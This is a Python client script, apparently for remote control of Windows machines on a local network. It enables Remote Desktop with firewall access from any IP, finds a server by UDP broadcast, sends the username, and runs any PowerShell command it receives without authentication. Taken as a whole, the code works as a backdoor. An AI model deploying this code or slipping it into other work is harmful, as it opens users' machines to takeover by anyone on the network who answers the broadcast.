import socket
import subprocess
import platform
import getpass
import time

def discover_server(port=12345):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    udp_socket.settimeout(5)

    try:
        udp_socket.sendto(b"DISCOVER_SERVER", ('<broadcast>', port))
        print("Broadcasted discovery message.")
        try:
            response, addr = udp_socket.recvfrom(1024)
            if response == b"SERVER_HERE":
                return addr[0]
        except socket.timeout:
            print("No server response received.")
    except socket.error as e:
        print(f"UDP socket error: {e}")
    finally:
        udp_socket.close()
    return None

def connect_to_server(server_ip, port=12345):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.settimeout(10)
    try:
        client_socket.connect((server_ip, port))
        # Send hostname to server
        hostname = getpass.getuser()  # You can use socket.gethostname() if you want the full machine name
        client_socket.sendall(hostname.encode())
        return client_socket
    except (socket.timeout, socket.error) as e:
        print(f"Failed to connect to server: {e}")
        client_socket.close()
        return None

def execute_command(command):
    try:
        subprocess.run(command, check=True, shell=True)
    except subprocess.CalledProcessError as e:
        print(f"Command execution failed: {e}")

def enable_rdp():
    print("Enabling Remote Desktop and configuring firewall for any connections...")
    rdp_script = """
    # Enable Remote Desktop
    $regPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"
    $rdpEnabled = Get-ItemProperty -Path $regPath -Name "fDenyTSConnections" | Select-Object -ExpandProperty "fDenyTSConnections"
    if ($rdpEnabled -eq 1) {
        Set-ItemProperty -Path $regPath -Name "fDenyTSConnections" -Value 0
        Write-Output "Remote Desktop enabled."
    } else {
        Write-Output "Remote Desktop is already enabled."
    }

    # Allow RDP through Windows Firewall
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    Write-Output "RDP allowed through firewall."

    # Allow connections from any IP by setting the scope to "Any"
    $firewallRule = Get-NetFirewallRule -DisplayGroup "Remote Desktop"
    if ($firewallRule) {
        Set-NetFirewallRule -DisplayGroup "Remote Desktop" -RemoteAddress "Any"
        Write-Output "Firewall rule updated to allow connections from any IP."
    } else {
        Write-Output "Firewall rule for Remote Desktop not found."
    }
    """
    execute_command(f'powershell -Command "{rdp_script}"')

def main():
    port = 12345
    client_socket = None

    # Enable RDP on client start
    enable_rdp()

    while True:
        if client_socket is None:
            print("Searching for server...")
            server_ip = discover_server(port)
            if server_ip:
                print(f"Found server at {server_ip}.")
                client_socket = connect_to_server(server_ip, port)
            else:
                print("Retrying in 5 seconds...")
                time.sleep(5)
        else:
            try:
                client_socket.settimeout(None)  # No timeout for receive operations
                data = client_socket.recv(1024)
                if not data:
                    raise ConnectionResetError("Server disconnected")
                command = data.decode()
                print(f"Received command: {command}")
                if command.startswith("POWERSHELL "):
                    ps_command = command[len("POWERSHELL "):]
                    execute_command(f'powershell -Command "{ps_command}"')
                elif command == "INSTALL":
                    execute_command("winget install SomeSoftware")
                elif command == "UNINSTALL":
                    execute_command("winget uninstall SomeSoftware")
                elif command == "FIX_WINDOWS":
                    execute_command("sfc /scannow")
            except (socket.error, ConnectionResetError) as e:
                print(f"Connection issue: {e}")
                client_socket.close()
                client_socket = None
                print("Reconnecting in 5 seconds...")
                time.sleep(5)

if __name__ == "__main__":
    main()
